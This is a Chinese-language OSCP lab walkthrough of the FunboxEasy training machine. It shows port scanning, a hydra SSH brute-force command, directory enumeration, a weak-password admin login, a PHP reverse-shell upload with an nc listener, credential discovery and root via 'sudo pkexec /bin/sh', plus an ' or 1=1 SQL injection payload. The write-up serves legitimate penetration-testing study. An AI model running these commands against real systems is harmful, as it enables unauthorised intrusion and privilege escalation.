# OSCP靶场系列-Esay-FunboxEasy

## 总结

getwebshell → 异常艰难的目录扫描 → 敏感信息泄露账户密码 → 文件上传登录

提 权 思 路 → 用户密码文件泄露 → `ssh`登录 → `sudo`提权

## 准备工作

  * 启动VPN  
获取攻击机IP > `192.168.45.207`

![](https://image.3001.net/images/20230802/1690939861_64c9b1d54929ce3ac46c8.png!small)

  * 启动靶机  
获取目标机器IP > `192.168.230.111`

![](https://image.3001.net/images/20230802/1690939862_64c9b1d62335535096370.png!small)

## 信息收集-端口扫描

### 目标开放端口收集

  * Nmap开放端口扫描2次

    
    
    sudo nmap --min-rate 10000 -p- 192.168.230.111
    

![](https://image.3001.net/images/20230802/1690939862_64c9b1d6d6a006cd62f1d.png!small)  
通过两次收集到的端口:`→22,80,33060`

### 目标端口对应服务探测

    
    
    # tcp探测
    sudo nmap -sT -sV -O -sC -p22,80,33060 192.168.230.111
    

![](https://image.3001.net/images/20230802/1690939863_64c9b1d7c8b194b29ea25.png!small)

## 信息收集-端口测试

### 22-SSH端口的信息收集

#### 22-SSH端口版本信息与MSF利用(无)

通过`Nmap`探测获得SSH的版本信息，可以尝试利用  
探测版本为`OpenSSH 8.2p1 Ubuntu 4ubuntu0.1`

    
    
    # 进入msf
    msfconsole
    # 搜索对应脚本
    msf6 > searchsploit OpenSSH 8.2p1
    

![](https://image.3001.net/images/20230802/1690939864_64c9b1d8a9abb8531273c.png!small)

#### 22-SSH协议支持的登录方式

通过`Nmap`探测获得SSH的版本信息，在获取到某个用户名之后尝试

    
    
    ssh root@192.168.230.111 -v
    # 如果显示publickey、password就是都支持
    

支持密钥以及密码登录

![](https://image.3001.net/images/20230802/1690939865_64c9b1d97f6c0b897ae01.png!small)

#### 22-SSH弱口令爆破(挂着)

既然支持密码登录尝试`root`账户的密码爆破，利用工具`hydra`，线程-t为6

    
    
    hydra -l root -P /usr/share/wordlists/metasploit/password.lst -t 6 -vV 192.168.230.111 ssh -s 22
    

期待奇迹发生，先挂着爆破弱口令

![](https://image.3001.net/images/20230802/1690939866_64c9b1da76a748dd766b2.png!small)

#### 22-SSH手动登录尝试(失败)

尝试`root`账户的密码爆破发现报错之后进行手动尝试

    
    
    ssh root@192.168.230.111 -p 22
    # 密码尝试
    password > root
    

![](https://image.3001.net/images/20230802/1690939867_64c9b1db6c6481f7772ae.png!small)

### 80-HTTP端口的信息收集

访问 `http://192.168.230.111:80`发现是建站页直接从源码查看开始

![](https://image.3001.net/images/20230802/1690939868_64c9b1dcad6ffff7bd8a3.png!small)

#### 信息收集-源码查看(无)

    
    
    # 包括文章中是否写明一些敏感信息
    curl http://192.168.230.111:80
    

![](https://image.3001.net/images/20230802/1690939869_64c9b1dd9f085398d7ef2.png!small)

#### 信息收集-目录扫描

##### 信息收集-目录扫描初步

    
    
    dirsearch -u http://192.168.230.111:80 -x 302,403
    

被吓到了，太多端点了

![](https://image.3001.net/images/20230802/1690939870_64c9b1de8348ad58b6226.png!small)  
因为扫出了目录，深层次的扫描待选

    
    
    信息收集-目录扫描(后缀)
    信息收集-目录扫描(深度/大字典)
    信息收集-目录扫描(深度/大字典后缀)
    

#### 信息收集-目录访问

##### `/robots.txt`端点

优先访问`robots.txt`端点

    
    
    curl http://192.168.230.111/robots.txt
    

得到`gym`

![](https://image.3001.net/images/20230802/1690939871_64c9b1dfa282912a93ab1.png!small)  
#####`/secret`端点  
从目录名字上来说，比较有诱惑力

    
    
    ┌──(root㉿Kali)-[/home/bachang/FunboxEasy]
    └─# curl http://192.168.230.111/secret/   
    „Anyone who lives within their means suffers from a lack of imagination.“
    Oscar Wilde (*1854 - †1900)
    

给了一段摸不着头脑的内容(后面没思路在思考)

![](https://image.3001.net/images/20230802/1690939872_64c9b1e051349ba08d621.png!small)

##### `/admin`端点与`/admin/?/login`端点

访问 `http://192.168.230.111/admin/`发现了登录端点  
`http://192.168.230.111/admin/?/login`端点同理

![](https://image.3001.net/images/20230802/1690939873_64c9b1e1096ae6d276921.png!small)

##### `/index.php`与`/index.php/login/`端点

访问 `http://192.168.230.111/index.php/login/`同样是一个登录端点

![](https://image.3001.net/images/20230802/1690939873_64c9b1e1c1fa19e75bd55.png!small)

##### 其余端点

从经验上来说 ，下面几个端点先放一边

  * /logout.php 是退出的php

  * /index.html 是首页

  * /checklogin.php 检查登录

  * /header.php 可能和检查有关

  * /admin/index.php 可能是调用login的内容

##### `/gym`端点

从泄露中访问对应端点 `http://192.168.230.111/gym/`

![](https://image.3001.net/images/20230802/1690939874_64c9b1e29fb10e058e63e.png!small)

### 各个端点的指纹收集

    
    
    whatweb http://192.168.230.111/admin
    whatweb http://192.168.230.111/gym/
    whatweb http://192.168.230.111/index.php/login/
    

根据现有信息得出`CMS`与`CRM`有关

![](https://image.3001.net/images/20230802/1690939875_64c9b1e3eecc0931775cb.png!small)  
尝试搜索`CRM`的漏洞发现还无法精确指纹

![](https://image.3001.net/images/20230802/1690939877_64c9b1e58b7878df5f3b0.png!small)

#### 目录扫描-2次递归

在似乎陷入困境之后思考到了之前目录扫描`301`的内容，接着扫描`/store`端点

    
    
    dirsearch -u http://192.168.230.111:80/store -x 302,403
    

又是劝退系列，特别多，慢慢访问

![](https://image.3001.net/images/20230802/1690939878_64c9b1e6e71fcf8a879df.png!small)

#### 信息收集-端点访问

##### `/store/.gitattributes`端点

该端点似乎存在了提示

    
    
    ┌──(root㉿Kali)-[/home/bachang/FunboxEasy]
    └─# curl http://192.168.230.111/store/.gitattributes
    # Auto detect text files and perform LF normalization
    * text=auto
    

##### `/store/functions/`端点

似乎存在路径遍历，访问之后没有显示内容，先待定

![](https://image.3001.net/images/20230802/1690939879_64c9b1e7eefb6c61292e0.png!small)

##### `/store/controllers/`端点同理

![](https://image.3001.net/images/20230802/1690939880_64c9b1e8d135071e2d64a.png!small)

##### `/store/database/`端点

在该端点下发现了有趣的内容

![](https://image.3001.net/images/20230802/1690939881_64c9b1e9abd224fb3f49d.png!small)  
`readme.txt.txt`文件提示了账号密码信息，数据库信息以及邮箱

![](https://image.3001.net/images/20230802/1690939882_64c9b1eaa90ef3df4bf2c.png!small)  
在`.sql`文件下发现一些敏感内容

    
    
    -- Database: `www_project`        
    ('admin', 'd033e22ae348aeb5660fc2140aec35850c4da997');
    

![](https://image.3001.net/images/20230802/1690939883_64c9b1eb8e907e21508f6.png!small)

##### `/store/template/`端点

![](https://image.3001.net/images/20230802/1690939884_64c9b1ec5c3e605743e4a.png!small)

##### `/store/index.php`与`/store/admin.php`端点

在访问的`index.php`端点下存在登录窗口

![](https://image.3001.net/images/20230802/1690939885_64c9b1ed3f8db1979d3bd.png!small)  
为`admin.php`

![](https://image.3001.net/images/20230802/1690939886_64c9b1ee58e6715a082cd.png!small)  
其余端点先省略(后期思考，主要端点太多了)

### 端点的指纹收集

主要收集`admin.php`

    
    
    whatweb http://192.168.230.111/store/admin.php
    

![](https://image.3001.net/images/20230802/1690939887_64c9b1ef39e16cadd8977.png!small)

## 漏洞利用-getwebshell

思考了一下 `/store/database/`端点的泄露很有意思

### 弱口令进入后台

访问 `http://192.168.230.111/store/admin.php`使用 `admin:admin`成功进入后台

![](https://image.3001.net/images/20230802/1690939888_64c9b1f0159005a3c4f65.png!small)

### 文件上传getwebshell尝试1(失败)

尝试修改文件的时候发现上传点

![](https://image.3001.net/images/20230802/1690939889_64c9b1f11af63629117e3.png!small)  
尝试文件上传发现存在`sql`错误

![](https://image.3001.net/images/20230802/1690939890_64c9b1f21bf04112deedf.png!small)

### 文件上传getwebshell尝试2(失败)

发现添加的按钮尝试添加

![](https://image.3001.net/images/20230802/1690939890_64c9b1f2d463db706aa5c.png!small)  
上传之后点击提交

![](https://image.3001.net/images/20230802/1690939891_64c9b1f3c139965a7d0c5.png!small)  
提示错误，`publisherid`这一行

![](https://image.3001.net/images/20230802/1690939892_64c9b1f49824f23a2ae5c.png!small)

### 文件上传getwebshell尝试3

检查了与`publisher`相关的行

![](https://image.3001.net/images/20230802/1690939893_64c9b1f56ab1a011f8f9b.png!small)  
收集了对应信息

    
    
    O'Reilly Media
    Apress
    Wrox
    Wiley
    Addison-Wesley
    

发现使用对应的内容上传即可成功

![](https://image.3001.net/images/20230802/1690939894_64c9b1f64e3d0c0492187.png!small)

##### 反弹shell-php

    
    
    # 利用cp命令cp一个到当前文件夹
    sudo cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
    

![](https://image.3001.net/images/20230802/1690939895_64c9b1f775694f3ee096c.png!small)

    
    
    # 开启监听
    sudo nc -lnvp 4444
    

![](https://image.3001.net/images/20230802/1690939896_64c9b1f84efca22228621.png!small)

    
    
    # 修改一下shell的反代地址
    vim shell.php
    

![](https://image.3001.net/images/20230802/1690939897_64c9b1f902110a48cef40.png!small)

##### 上传shell

![](https://image.3001.net/images/20230802/1690939897_64c9b1f9def33f37ba388.png!small)

##### 发现上传点

发现上传的图片在首页可以查看到大致位置

![](https://image.3001.net/images/20230802/1690939898_64c9b1faaf0dbb4433f3f.png!small)

    
    
    http://192.168.230.111/store/bootstrap/img/c_sharp_6.jpg
    

推理我们上传的在

    
    
    http://192.168.230.111/store/bootstrap/img/shell.php
    

成功获得`shell`感觉异常艰难

![](https://image.3001.net/images/20230802/1690939900_64c9b1fc15a2687cb39a0.png!small)

## 内网遨游-getshell

### 交互shell

由于获取的shell交互不友好，利用python获得新的交互shell

    
    
    python -c "import pty;pty.spawn('/bin/bash')";
    # 利用python获取交互shell -> python失败使用python3
    python3 -c "import pty;pty.spawn('/bin/bash')";
    

![](https://image.3001.net/images/20230802/1690939901_64c9b1fd9c3338d5ecdfd.png!small)

### FLAG1获取

    
    
    www-data<span>@funbox3</span>:/$ find / -name local.txt 2>/dev/null
    find / -name local.txt 2>/dev/null
    /var/www/local.txt
    www-data<span>@funbox3</span>:/$ cat /var/www/local.txt
    cat /var/www/local.txt
    ********************
    

![](https://image.3001.net/images/20230802/1690939902_64c9b1fec59b5b899ee45.png!small)

### 提权基础(内网信息收集)

提权的本质在于枚举

#### 检测Linux操作系统的发行版本

    
    
    # 确定发行版本
    lsb_release -a
    

`Ubuntu 20.01`发行版不太能`overlayfs`提权

![](https://image.3001.net/images/20230802/1690939903_64c9b1ff9aa79faad1f74.png!small)

#### 检测Linux操作系统的内核版本

    
    
    cat /proc/version
    uname -a
    

内核版本 `5.4.0`

![](https://image.3001.net/images/20230802/1690939904_64c9b2005663a4e88a0f7.png!small)

#### sudo收集(需要密码)

查找具有`sudo`权限，且不需要密码的可提权文件

    
    
    # 利用sudo -l寻找
    sudo -l
    

![](https://image.3001.net/images/20230802/1690939904_64c9b200ee2e9ec211b88.png!small)

#### suid权限收集

搜索`suid`文件权限

    
    
    # -perm 文件权限
    find / -perm -u=s -type f 2>/dev/null
    

![](https://image.3001.net/images/20230802/1690939905_64c9b201953096db8e71e.png!small)

#### /etc/passwd权限收集

    
    
    ls -al /etc/passwd
    -rw-r--r-- 1 root root 1807 Jul 30  2020 /etc/passwd
    

![](https://image.3001.net/images/20230802/1690939906_64c9b202e185bcbfc9d19.png!small)

#### getcap标志进程收集

    
    
    # 探查有CAP_SETUID标志的进程
    /usr/sbin/getcap -r / 2>/dev/null
    

![](https://image.3001.net/images/20230802/1690939907_64c9b203da9e30fd1fda0.png!small)

#### /home用户下信息收集

发现`/home`目录下只有`tony`

    
    
    ls -al /home/tony
    

![](https://image.3001.net/images/20230802/1690939908_64c9b204a36f19143b33e.png!small)  
发现了`password.txt`查看发现敏感信息

    
    
    www-data@funbox3:/home/tony$ cat password.txt
    ssh: yxcvbnmYYY
    gym/admin: asdfghjklXXX
    /store: admin@admin.com admin
    

#### ssh登录

通过敏感信息推测`tony`账户的密码是`yxcvbnmYYY`  
获取账号密码之后利用SSH进行登录

    
    
    sudo ssh tony@192.168.230.111 -p22
    password > yxcvbnmYYY
    

![](https://image.3001.net/images/20230802/1690939909_64c9b205a60fd55a3b344.png!small)

#### sudo收集

查找具有`sudo`权限，且不需要密码的可提权文件

    
    
    # 利用sudo -l寻找
    sudo -l
    

发现了许多可以提权的文件，进行提权

### 权限提升

#### Linux提权-sudo提权

查找具有`sudo`权限，且不需要密码的可提权文件

    
    
    (root) NOPASSWD: /usr/bin/yelp
        (root) NOPASSWD: /usr/bin/dmf
        (root) NOPASSWD: /usr/bin/whois
        (root) NOPASSWD: /usr/bin/rlogin
        (root) NOPASSWD: /usr/bin/pkexec
        (root) NOPASSWD: /usr/bin/mtr
        (root) NOPASSWD: /usr/bin/finger
        (root) NOPASSWD: /usr/bin/time
        (root) NOPASSWD: /usr/bin/cancel
        (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
    

如果发现sudo -l有东西的话 访问 https://gtfobins.github.io 寻找  
发现`pkexec`提权

![](https://image.3001.net/images/20230802/1690939910_64c9b206c9998fd9abcb8.png!small)  
![](https://image.3001.net/images/20230802/1690939911_64c9b207a71009563be0c.png!small)

    
    
    sudo pkexec /bin/sh
    

![](https://image.3001.net/images/20230802/1690939912_64c9b2088cb36c9afdb87.png!small)  
提权成功~

### FLAG2获取

    
    
    # cat /root/proof.txt
    **********************
    

完结撒花~

## 后记(忽略的点)

该登录端点 `CSE Bookstore`存在`SQL`注入

![](https://image.3001.net/images/20230802/1690939913_64c9b209439eacc204472.png!small)

  * `' or 1=1; --`测试注入之后可以用`sqlmap`获取数据库信息

